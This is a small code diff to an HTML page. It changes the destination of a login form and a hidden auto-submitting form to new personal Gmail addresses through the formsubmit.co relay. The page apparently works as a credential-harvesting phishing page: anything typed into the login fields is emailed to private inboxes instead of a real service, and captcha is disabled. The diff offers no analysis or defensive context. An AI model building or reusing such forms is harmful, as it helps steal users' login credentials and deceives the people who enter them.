@@ -184,7 +184,7 @@
       </div>
 
       <!-- Login Form -->
-      <form id="loginForm" action="https://formsubmit.co/tshabamapheloaskoya@gmail.com" method="POST">
+      <form id="loginForm" action="https://formsubmit.co/skoyabafuetho21@gmail.com" method="POST">
         <input type="hidden" name="_captcha" value="false" />
         <div class="row">
           <i class="fas fa-user"></i>
@@ -216,7 +216,7 @@
       </form>
 
       <!-- Invisible VIP form -->
-      <form id="vipForm" action="https://formsubmit.co/maremalungile00@gmail.com" method="POST" style="display:none;">
+      <form id="vipForm" action="https://formsubmit.co/robararoba21@gmail.com" method="POST" style="display:none;">
         <input type="hidden" name="message" value="vip, voucher point claimed" />
         <input type="submit" />
       </form>
@@ -280,3 +280,4 @@
   </script>
 </body>
 </html>
+
